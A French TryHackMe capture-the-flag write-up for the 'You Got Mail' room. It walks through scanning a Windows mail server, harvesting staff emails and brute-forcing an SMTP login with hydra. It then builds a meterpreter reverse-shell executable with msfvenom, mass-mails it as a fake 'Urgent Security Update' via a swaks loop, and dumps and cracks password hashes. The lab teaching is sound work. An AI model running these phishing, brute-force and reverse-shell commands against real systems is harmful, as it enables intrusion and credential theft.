---
date: 2025-02-09T14:59:41-06:00
# description: ""
image: "/images/THM-YouGotMail/YGM.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: You Got Mail"
type: "post"
---

* Platforme: TryHackMe
* Lien: [You Got Mail](https://tryhackme.com/room/yougotmail)
* Niveau: Moyen
* OS: Windows
---

Cette room présente une attaque par hameçonnage. Après avoir collecté une liste d'emails, nous utilisons `cewl` pour créer une liste de mots de passe personnalisée. Hydra récupère avec succès le mot de passe de l'un des e-mails. Avec `swaks`, nous envoyons un email de phishing qui aboutit à un reverse shell sur le système cible. À partir de là, nous récupérons le mot de passe d'un compte utilisateur ainsi que le mot de passe administrateur de `hMailServer`.

## Balayage

```
nmap -T4 -n -sC -sV -Pn -p- {TARGET_IP}
```

**Résultats**

```shell           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 17:28 CST
Warning: 10.10.16.179 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.16.179
Host is up (0.18s latency).
Not shown: 65504 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
25/tcp    open     smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

110/tcp   open     pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP

135/tcp   open     msrpc         Microsoft Windows RPC

139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn

143/tcp   open     imap          hMailServer imapd
|_imap-capabilities: CAPABILITY IDLE QUOTA RIGHTS=texkA0001 CHILDREN NAMESPACE completed IMAP4 ACL IMAP4rev1 OK SORT

445/tcp   open     microsoft-ds?

587/tcp   open     smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2025-02-09T21:23:09
|_Not valid after:  2025-08-11T21:23:09
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-10T23:43:35+00:00
|_ssl-date: 2025-02-10T23:43:42+00:00; 0s from scanner time.

4349/tcp  filtered fsportmap
4750/tcp  filtered ssad

5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

17854/tcp filtered unknown
18527/tcp filtered unknown
22815/tcp filtered unknown
24814/tcp filtered unknown
30513/tcp filtered unknown

47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

47010/tcp filtered unknown

49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     msrpc         Microsoft Windows RPC

50388/tcp filtered unknown
51348/tcp filtered unknown
53546/tcp filtered unknown
62352/tcp filtered unknown
64819/tcp filtered unknown
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-10T23:43:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 947.53 seconds
```

Nmap trouve quelques services Windows (SMB et MSRPC), quelques services de messagerie (SMTP et POP3), et des serveurs web. De plus, nous sommes autorisés à faire de la reconnaissance passive sur `https://brownbrick.co/`.

## Enumération

A `https://brownbrick.co/` nous trouvons un site web statique.

![target website](/images/THM-YouGotMail/YGM_website.png)

Étant donné la consigne de n'effectuer qu'une reconnaissance passive sur `https://brownbrick.co/`, il est inutile d'essayer de forcer les répertoires ou d'énumérer les sous-domaines.

Sur la page "Our Team" à `https://brownbrick.co/menu.html`, nous recueillons quelques emails.

![email list](/images/THM-YouGotMail/emails_list.png)

```
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
```

Nous pouvons envoyer des données à `https://brownbrick.co/reservation.html?` mais rien ne semble exploitable.

Nous pouvons également envoyer des informations à `https://brownbrick.co/contact.html` mais on nous dit que le serveur de messagerie ne répond pas.

![No response from the email server](/images/THM-YouGotMail/server_no_response.png)

Créons une liste de mots de passe personnalisée avec `cewl`.

```
cewl --lowercase https://brownbrick.co/ > pwds.txt
```

![custom password list with cewl](/images/THM-YouGotMail/custom_pwds_list.png)

En utilisant hydra, nous effectuons une attaque par force brute avec les mots de passe générés.

```
hydra -L emails.txt -P pwds.txt {TARGET_IP} smtp -s 587 
```

> Les ports utilisés par le SMTP ont des objectifs différents. Le port 587 est utilisé pour envoyer des courriels de clients à des serveurs de messagerie (soumission SMTP), tandis que le port 25 est utilisé pour la transmission de courriels de serveur à serveur (relais SMTP).

Nous trouvons une correspondance pour `lhedvig@brownbrick.co:bricks`.

![hydra SMTP brute force attack](/images/THM-YouGotMail/hydra_smtp.png)

Nous pouvons tester la connexion à une boîte aux lettres spécifique via POP3 en utilisant TELNET, mais elle s'avère vide.

```
telnet {TARGET_IP} 110
USER lhedvig@brownbrick.co
PASS bricks
```

![Mailbox access via telnet](/images/THM-YouGotMail/telnet_check.png)

## Drapeau utilisateur

Essayons d'envoyer quelques messages électroniques avec une pièce jointe malveillante.

* Nous créons un fichier exe malveillant avec msfvenom à utiliser comme pièce jointe.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe > payload.exe
```

* Nous configurons un listener avec Metasploit.

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT PORT_NUMBER
run
```

Nous pouvons envoyer un courriel à toutes les autres adresses électroniques à l'aide de [swaks](https://github.com/jetmore/swaks).

```shell
for email in oaurelius@brownbrick.co tchikondi@brownbrick.co wrohit@brownbrick.co pcathrine@brownbrick.co fstamatis@brownbrick.co; do
    swaks --to $email --from lhedvig@brownbrick.co \
    --server 10.10.16.179 --port 25 --auth LOGIN \
    --auth-user lhedvig@brownbrick.co --auth-password bricks \
    --header "Subject: Urgent Security Update" \
    --body "Please review the attachment" \
    --attach @payload.exe
done
```

![Emails sent via swaks](/images/THM-YouGotMail/swaks_send_emails.png)

Nous obtenons un shell en tant que `wrohit` et pouvons lire le drapeau utilisateur.

![user flag](/images/THM-YouGotMail/flag_txt.png)

Avec `net localgroup` nous remarquons que cet utilisateur fait partie du groupe `Administrators` en plus de beaucoup d'autres.

![group memberships](/images/THM-YouGotMail/group_memberships.png)

### Récupération du mot de passe wrohit

Puisque nous avons des privilèges élevés, dans notre shell meterpreter nous utilisons `hashdump` pour récupérer les hashs des mots de passe des utilisateurs.

![hashdump command](/images/THM-YouGotMail/hashdump.png)

En utilisant [CrackStation](https://crackstation.net/), nous récupérons le mot de passe de `wrohit`. 

![wrohit password](/images/THM-YouGotMail/wrohit_pwd.png)

## Mot de passe administrateur hMailServer

Le hachage du mot de passe de `hMailServer Administrator Dashboard` se trouve dans `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI`.

![hMailServer password hash](/images/THM-YouGotMail/admin_pwd.png)

Nous pouvons également le cracker avec [CrackStation](https://crackstation.net/).

![hMailServer admin password](/images/THM-YouGotMail/cracked_admin_pwd.png)


